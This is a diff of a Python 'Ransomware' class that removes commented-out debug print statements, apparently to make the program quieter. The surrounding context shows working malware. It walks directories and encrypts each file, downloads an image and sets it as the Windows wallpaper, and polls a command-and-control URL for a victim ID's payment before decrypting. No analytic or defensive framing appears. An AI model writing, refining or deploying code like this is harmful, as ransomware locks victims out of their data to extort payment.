@@ -261,7 +261,7 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.encrypt_file(filepath)
-                            # print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
+
             except Exception as err:
                 print("start_encryption(): Error --> ", err)
         self.encryption_key = None
@@ -295,7 +295,7 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.decrypt_file(filepath)
-                            # print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
+
             except Exception as err:
                 print("start_decryption(): Error --> ", err)
 
@@ -326,7 +326,6 @@ class Ransomware:
             file = open(image_path, "wb")
             file.write(response.content)
             file.close()
-            # print("🖼🖼🖼 Changing wallpaper...")
             ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
         except FileNotFoundError as err:
             print("change_wallpaper(): FileNotFound Error --> ", err)
@@ -341,13 +340,11 @@ class Ransomware:
         self.box = nacl.secret.SecretBox(bin_key)
 
     def sync_loop(self):
-        # print("💲💲💲 Starting loop to check for payment receival...")
         while (
             httpx.post(f"{c2_url}/check/{self.victim_id}").headers["Payment-Received"]
             == "False"
         ):
             sleep(5)
-            # print("😴 Syncing...")
 
         self.setup_decryption()
         self.start_decryption()
